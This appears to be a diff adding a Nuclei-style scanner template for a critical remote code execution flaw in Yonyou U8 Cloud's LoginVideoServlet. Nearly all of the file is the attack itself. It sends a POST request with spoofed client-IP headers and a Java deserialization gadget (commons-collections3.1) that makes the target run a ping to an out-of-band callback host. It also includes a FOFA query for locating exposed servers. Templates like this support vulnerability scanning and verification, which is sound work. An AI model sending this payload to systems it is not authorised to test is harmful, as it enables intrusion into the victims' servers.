@@ -1,0 +1,33 @@
+id: yonyou-u8-cloud-LoginVideoServlet-rce
+
+info:
+  name: 用友 U8 Cloud LoginVideoServlet - rce
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - todo
+  metadata:
+    verified: true
+    fofa-qeury: app="用友-U8-Cloud" || title=="U8C"
+  tags: yonyou,u8cloud,oa,rce,oob
+
+http:
+  - raw:
+    - |
+      POST /servlet/LoginVideoServlet HTTP/1.1
+      Host: {{Hostname}}
+      X-Forwarded-For: 127.0.0.10
+      X-Originating-IP: 127.0.0.10
+      X-Remote-Addr: 127.0.0.10
+      X-Remote-IP: 127.0.0.10
+
+      {{generate_java_gadget("commons-collections3.1", "ping {{interactsh-url}}", "raw")}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
